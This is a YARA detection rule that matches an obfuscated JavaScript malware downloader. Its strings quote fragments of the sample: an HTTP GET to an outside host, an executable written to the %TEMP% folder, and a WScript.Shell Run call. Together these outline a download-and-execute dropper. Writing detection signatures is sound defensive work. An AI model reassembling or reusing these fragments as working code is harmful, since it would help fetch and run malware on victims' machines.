rule sig_20160328_eb339edfddc39a5a8b2ccd6d56ea8e5c {
  meta:
    description = "datamaliciousorder - file 20160328_eb339edfddc39a5a8b2ccd6d56ea8e5c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "caf2d96115a99376a2be897a74d41fa78cbe8cd750d460ee16273360a4c84bda"

  strings:
    $s1  = "function Vsbapajym() {return Zsvajmgqmp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Q2LTfuOSx.exe\";};" fullword ascii
    $s2  = "Sewmgwuij[Kchqneg](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Rsvtiy](Zntyqp() * 11)} while (Sewmgwuij[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Evwossv(Pmjxqgavr, Idkfdzkoys){return Pmjxqgavr - Idkfdzkoys;};" fullword ascii
    $s5  = "var Zsvajmgqmp = function Ubieygbr() {return WScript[Zocxovc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xbnywd() {return ((Zkstmw == true) && (Zkstmw == Goahjwqyq)) ? 1 : Awsjuuvij;};" fullword ascii
    $s7  = "function Mrjiyltkhp(Unnkwbgl){Zsvajmgqmp[\"Run\"](Unnkwbgl, Awsjuuvij, Awsjuuvij);};" fullword ascii
    $s8  = "var Zkstmw = false;" fullword ascii
    $s9  = "var Mvrxtzoe = false;" fullword ascii
    $s10 = "var Bmwbvs = new this[\"Date\"]();" fullword ascii
    $s11 = "function Unbsmlfy(Wloiuztw) {var Cktawf = (1, 2, 3, 4, 5, Wloiuztw); return Cktawf;};" fullword ascii
    $s12 = "function Yzohuhgkp(){return Zocxovc;};" fullword ascii
    $s13 = "Goahjwqyq = true; " fullword ascii
    $s14 = " while (Bnvkzjh){" fullword ascii
    $s15 = "return Evwossv(Lzggbpa, Cfuswpf);" fullword ascii
    $s16 = "function Zntyqp(){return 22;};" fullword ascii
    $s17 = "var Goahjwqyq = false;" fullword ascii
    $s18 = "function Rrwazvwsr(){return Fbjlaozoc;};" fullword ascii
    $s19 = "Zkstmw = true; " fullword ascii
    $s20 = "function Rtqeyscoc()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}